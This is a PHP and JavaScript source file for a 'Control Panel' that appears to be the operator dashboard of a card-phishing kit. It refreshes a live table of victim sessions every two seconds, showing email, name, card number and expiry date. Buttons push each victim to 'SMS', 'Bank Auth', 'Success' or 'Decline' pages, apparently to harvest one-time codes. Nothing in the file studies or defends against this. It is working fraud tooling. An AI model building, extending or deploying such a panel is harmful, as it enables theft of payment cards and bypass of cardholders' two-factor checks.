<?php
session_start();

// Only modify config if explicitly requested
if (isset($_POST['update_theme'])) {
    $config = require __DIR__ . '/config.php';
    // Load existing config
    $config = require __DIR__ . '/config.php';

    // Only update theme color if it's actually changed
    if (!isset($config['store']['theme_color']) || $config['store']['theme_color'] !== '#FFBABA') {
        // Preserve existing config values
        $newConfig = $config;
        
        // Update only the theme color
        if (!isset($newConfig['store'])) {
            $newConfig['store'] = array();
        }
        $newConfig['store']['theme_color'] = '#FFBABA';
        
        // Write back to file
        $configContent = "<?php return " . var_export($newConfig, true) . ";";
        file_put_contents(__DIR__ . '/config.php', $configContent, LOCK_EX);
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100">
    <div class="max-w-6xl mx-auto p-6">
        <div class="bg-white rounded-lg shadow-md p-6">
            <div class="flex justify-between items-center mb-6">
                <h1 class="text-2xl font-bold">Active Sessions</h1>
                <span class="text-sm text-gray-500" id="lastUpdate"></span>
            </div>
            <div class="overflow-x-auto">
                <table class="min-w-full bg-white">
                    <thead>
                        <tr class="bg-gray-100">
                            <th class="py-3 px-4 text-left">Session ID</th>
                            <th class="py-3 px-4 text-left">User Info</th>
                            <th class="py-3 px-4 text-left">Card Info</th>
                            <th class="py-3 px-4 text-left">Status</th>
                            <th class="py-3 px-4 text-left">Actions</th>
                        </tr>
                    </thead>
                    <tbody id="activeSessions">
                        <!-- Sessions will be populated here via JavaScript -->
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        function updateSessions() {
            fetch('/get_sessions.php')
                .then(response => response.json())
                .then(sessions => {
                    const tbody = document.getElementById('activeSessions');
                    tbody.innerHTML = '';
                    
                    sessions.forEach(session => {
                        const tr = document.createElement('tr');
                        tr.innerHTML = `
                            <td class="py-3 px-4 border-b">${session.id}</td>
                            <td class="py-3 px-4 border-b">
                                ${session.email || 'N/A'}<br>
                                ${session.name || 'N/A'}
                            </td>
                            <td class="py-3 px-4 border-b">
                                ${session.cardNumber || 'N/A'}<br>
                                ${session.expiryDate || 'N/A'}
                            </td>
                            <td class="py-3 px-4 border-b">
                                <span class="px-2 py-1 rounded ${
                                    session.status === 'loading' ? 'bg-yellow-100 text-yellow-800' :
                                    session.status === 'success' ? 'bg-green-100 text-green-800' :
                                    session.status === 'shipping' ? 'bg-blue-100 text-blue-800' :
                                    'bg-red-100 text-red-800'
                                }">
                                    ${session.status || 'unknown'}
                                </span>
                            </td>
                            <td class="py-3 px-4 border-b">
                                <div class="flex space-x-2">
                                    <button onclick="redirect('${session.id}', 'success')"
                                            class="px-3 py-1 bg-green-500 text-white rounded hover:bg-green-600">
                                        Success
                                    </button>
                                    <button onclick="redirect('${session.id}', 'sms')"
                                            class="px-3 py-1 bg-blue-500 text-white rounded hover:bg-blue-600">
                                        SMS
                                    </button>
                                    <button onclick="redirect('${session.id}', 'bank')"
                                            class="px-3 py-1 bg-purple-500 text-white rounded hover:bg-purple-600">
                                        Bank Auth
                                    </button>
                                    <button onclick="redirect('${session.id}', 'declined')"
                                            class="px-3 py-1 bg-red-500 text-white rounded hover:bg-red-600">
                                        Decline
                                    </button>
                                </div>
                            </td>
                        `;
                        tbody.appendChild(tr);
                    });

                    // Update last refresh time
                    document.getElementById('lastUpdate').textContent = 
                        `Last updated: ${new Date().toLocaleTimeString()}`;
                });
        }

        function redirect(sessionId, action) {
            fetch('/redirect_user.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    sessionId: sessionId,
                    action: action
                })
            }).then(() => updateSessions());
        }

        // Update sessions every 2 seconds
        setInterval(updateSessions, 2000);
        updateSessions();
    </script>
</body>
</html> 